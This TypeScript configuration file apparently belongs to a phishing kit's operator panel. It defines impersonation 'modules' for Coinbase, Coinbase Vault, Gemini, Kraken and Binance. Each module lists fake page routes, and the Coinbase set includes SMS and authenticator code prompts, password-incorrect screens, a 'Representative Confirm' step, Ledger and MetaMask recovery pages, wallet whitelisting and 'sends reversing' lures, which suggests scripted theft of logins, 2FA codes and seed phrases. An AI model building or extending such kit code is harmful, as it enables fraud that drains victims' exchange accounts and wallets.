export interface ModuleDefinition {
	id: string;
	label: string;
	icon: string;
	color: string;
	landingPages: { value: string; label: string }[];
	signinPages: { value: string; label: string }[];
}

const COINBASE_LANDING = [
	{ value: '/loading', label: 'Loading Page' },
	{ value: '/sign-in/loading', label: 'Sign-in Loading' },
	{ value: '/sign-in', label: 'Sign-in Page' },
	{ value: '/case', label: 'Case Form' },
	{ value: '/wallet/setup', label: 'Wallet Setup' },
	{ value: '/dashboard', label: 'Dashboard' },
	{ value: '/processing', label: 'Processing' }
];

const COINBASE_SIGNIN = [
	{ value: '/signin/review-transaction', label: 'Review Transaction' },
	{ value: '/signin/change-password', label: 'Password Reset' },
	{ value: '/signin/url', label: 'URL Entry' },
	{ value: '/signin/sms-incorrect', label: 'SMS Incorrect' },
	{ value: '/signin/sms', label: 'SMS Verification' },
	{ value: '/signin/sms7', label: 'SMS Verification (7-digit)' },
	{ value: '/signin/sms8', label: 'SMS Verification (8-digit)' },
	{ value: '/signin/email-code', label: 'Email Verification Code' },
	{ value: '/signin/representative', label: 'Representative Confirm' },
	{ value: '/signin/auth-code', label: 'Authentication Code' },
	{ value: '/signin/auth-code-incorrect', label: 'Auth Code Incorrect' },
	{ value: '/signin/incorrect-pw', label: 'Password Incorrect' },
	{ value: '/signin/generate-wallet', label: 'Generate Wallet' },
	{ value: '/signin/wallet/setup-wallet', label: 'Wallet Setup' },
	{ value: '/signin/external-wallet', label: 'External Wallet' },
	{ value: '/signin/disconnect-wallet', label: 'Disconnect Wallet' },
	{ value: '/signin/whitelist-success', label: 'Whitelist Success' },
	{ value: '/signin/unlink-wallet', label: 'Unlink Wallet' },
	{ value: '/signin/whitelist-wallet', label: 'Whitelist Wallet' },
	{ value: '/signin/wallet/trezor-unlink', label: 'Trezor Unlink' },
	{ value: '/signin/wallet/ledger-unlink', label: 'Ledger Unlink' },
	{ value: '/signin/wallet/trezor-unlink-success', label: 'Trezor Disconnected' },
	{ value: '/signin/wallet/ledger-unlink-success', label: 'Ledger Disconnected' },
	{ value: '/signin/wallet/sends-reversing', label: 'Sends Reversing' },
	{ value: '/signin/wallet/wallet-connect-unlink', label: 'Wallet Connect Unlink' },
	{ value: '/signin/ledger-recovery', label: 'Ledger Recovery' },
	{ value: '/signin/metamask-recovery', label: 'MetaMask Recovery' },
	{ value: '/signin/pending-callback', label: 'Pending Callback' },
	{ value: '/signin/processing', label: 'Processing' },
	{ value: '/signin/reschedule', label: 'Reschedule' },
	{ value: '/signin/unauthorized', label: 'Unauthorized' },
	{ value: '/signin/estimate-hold', label: 'Estimate Hold' },
	{ value: '/signin/review', label: 'Review Page' },
	{ value: '/signin/wallet/setup-wallet', label: 'Wallet Setup Main' }
];

export const MODULES: ModuleDefinition[] = [
	{
		id: 'Coinbase',
		label: 'Coinbase',
		icon: '/images/coinbase.png',
		color: 'blue',
		landingPages: COINBASE_LANDING,
		signinPages: COINBASE_SIGNIN
	},
	{
		id: 'Coinbase Vault',
		label: 'Coinbase Vault',
		icon: '/images/coinbase.png',
		color: 'purple',
		landingPages: [
			{ value: '/vault/setup', label: 'Vault Setup' },
			{ value: '/vault/dashboard', label: 'Vault Dashboard' },
			{ value: '/vault/processing', label: 'Vault Processing' }
		],
		signinPages: COINBASE_SIGNIN
	},
	{
		id: 'Gemini',
		label: 'Gemini',
		icon: '/images/gemini.png',
		color: 'cyan',
		landingPages: [
			{ value: '/loading', label: 'Loading Page' },
			{ value: '/signin', label: 'Sign In' }
		],
		signinPages: []
	},
	{
		id: 'Kraken',
		label: 'Kraken',
		icon: '/images/kraken.png',
		color: 'violet',
		landingPages: [
			{ value: '/loading', label: 'Loading Page' },
			{ value: '/signin', label: 'Sign In' }
		],
		signinPages: []
	},
	{
		id: 'Binance',
		label: 'Binance',
		icon: '/images/binance.png',
		color: 'amber',
		landingPages: [
			{ value: '/loading', label: 'Loading Page' },
			{ value: '/signin', label: 'Sign In' }
		],
		signinPages: []
	}
];

export function getModule(id: string): ModuleDefinition | undefined {
	return MODULES.find((m) => m.id === id);
}

export function getLandingPagesFor(moduleId: string): { value: string; label: string }[] {
	return getModule(moduleId)?.landingPages ?? [];
}

export function getAllSigninPages(): { value: string; label: string }[] {
	return COINBASE_SIGNIN;
}
